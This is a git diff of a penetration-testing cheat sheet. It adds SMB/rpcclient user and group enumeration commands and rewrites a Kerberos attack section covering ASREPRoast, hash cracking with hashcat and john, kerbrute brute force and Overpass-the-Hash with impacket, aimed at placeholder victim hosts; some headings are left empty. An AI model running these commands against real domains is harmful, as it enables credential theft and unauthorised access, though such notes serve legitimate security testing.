@@ -617,6 +617,28 @@ It's protocol for sharing files and resources. Runs on port 445 or on port 139
   -U "" - null session
   -N - no password
 ```
+
+- Get a list of users
+```
+enumdomusers
+```
+
+- Get a user info
+```
+queryuser <rid_number>
+```
+
+- Get a list of groups
+```
+enumdomgroups
+```
+
+- Get a group members
+```
+querygroup <rid_number>
+```
+
+
 #### NetBIOS_Service
 - nbtscan -r [victim_ip]
 
@@ -995,32 +1017,16 @@ curl -u '<username>':'<userpassword>' http://<victim_ip>:8080/rev_shell
 
 --------------------------------------------------------------------------------------------------------------------------------
 
-## Kerberos
+#### Kerberos
 Protocol for authentication and authorization in a computer network with the use of a key distribution center
 
-### Kerberos brute force
-
-- Tool: https://github.com/TarlogicSecurity/kerbrute
-
-- Usage:
+- Kerberos preauthentication (ASREPRoast)
+The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password(TGT encrypted) could be cracked offline.
 ```
-python kerbrute.py -domain domain.name -users users.txt -passwords passwords.txt -outputfile output_file_name.txt
-```
-### ASREPRoast
-
-- Tool: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
-
-- Usage:
-```
-example 1:
-python GetNPUsers.py domain.name/ -usersfile usernames.txt -format hashcat -outputfile hashes.file
-
-example 2:
-python GetNPUsers.py domain.name/user_name:password -request -format hashcat -outputfile hashes.file
+impacket-GetNPUsers <domain.name>/ -dc-ip <victim_ip> -request
 ```
 
-- Cracking AS_REP hash
-
+Cracking TGT hash
 ```
 hashcat -m 18200 --force -a 0 hashes.file rock_you.txt
 ```
@@ -1029,34 +1035,29 @@ hashcat -m 18200 --force -a 0 hashes.file rock_you.txt
 john --wordlist=rock_you.txt hashes.file
 ```
 
-### Kerberoasting
+- Kerberos brute-force
 
-- Tool: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
+Tool: https://github.com/TarlogicSecurity/kerbrute
 
-- Usage:
+Usage:
 ```
-python GetUserSPNs.py domain.name/user_name:user_password -outputfile hashes.file
-```
-
-- Cracking TGSs hash
-```
-hashcat -m 13100 --force -a 0 hashes.file rock_you.txt
+python kerbrute.py -domain domain.name -users users.txt -passwords passwords.txt -outputfile output_file_name.txt
 ```
 
+- Kerberoasting
+
+
+
+- Overpass The Hash/Pass The Key (PTK)
+This attack aims to use user NTLM hash to request Kerberos tickets, as an alternative to the common Pass The Hash over NTLM protocol.
+
+Usage:
 ```
-john --format=krb5tgs --wordlist=rock_you.txt hashes.file
-```
-
-### Overpass The Hash/Pass The Key
-
-- Tool: https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py
-
-- Usage:
-```
-python getTGT.py domain.name/user_name -hashes :NTLM hash
-
-python psexec.py domain.name/user_name@<machine_ip> -k -no-pass
+impacket-getTGT domain.name/user_name -hashes :<NTLM hash>
 ```
 
-### Pass the key
+- Pass the ticket(PTT)
 
+- Silver ticket
+
+- Golden ticket
